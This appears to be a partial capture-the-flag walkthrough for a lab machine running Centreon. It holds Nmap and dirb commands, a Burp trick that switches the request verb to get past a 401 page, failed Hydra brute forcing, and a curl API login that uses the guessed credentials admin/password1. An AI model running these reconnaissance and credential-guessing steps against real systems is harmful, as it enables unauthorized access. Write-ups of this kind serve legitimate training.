Enumerate with Nmap:
nmap -sC -sV -oA wall 10.10.10.157



h2 Run dirb:
enumerate .php files
dirb http://10.10.10.157/ -x .php 

basic enumeration with common word list
`dirb http://10.10.10.157/`
```
---- Scanning URL: http://10.10.10.157/ ----
+ http://10.10.10.157/index.html (CODE:200|SIZE:10918)                                                                        
+ http://10.10.10.157/monitoring (CODE:401|SIZE:459)  
```




Capture call to /monitoring on burp
Replace GET verb with POST in repeater and take note of url in response:

HTTP/1.1 200 OK
Date: Thu, 28 Nov 2019 05:19:48 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Wed, 03 Jul 2019 22:47:23 GMT
ETag: "9a-58ccea50ba4c6-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 154
Connection: close
Content-Type: text/html

<h1>This page is not ready yet !</h1>
<h2>We should redirect you to the required page !</h2>

<meta http-equiv="refresh" content="0; URL='/centreon'" />





Navigate to /centreon based on the response above.  Get presented with auth form. 

Tried to brute force with Rock_You.txt using both Hydra and Burp sniper.  To no avail.  Looked up default Centreon creds.  Scoured forums.  Looked up common passwords.  Attempted the following curl by hand after looking up how to authenticate over the centreon api.
curl --request POST --url 10.10.10.157/centreon/api/index.php?action=authenticate -d "usernam
e=admin&password=password1"                                                                                                    
{"authToken":"h0ZncxKGai\/T592mP00tzQFObSJcUOgKPWVo1qrb3gw="}

Found "password1" using the following CNN article LOL
https://www.cnn.com/2019/04/22/uk/most-common-passwords-scli-gbr-intl/index.html









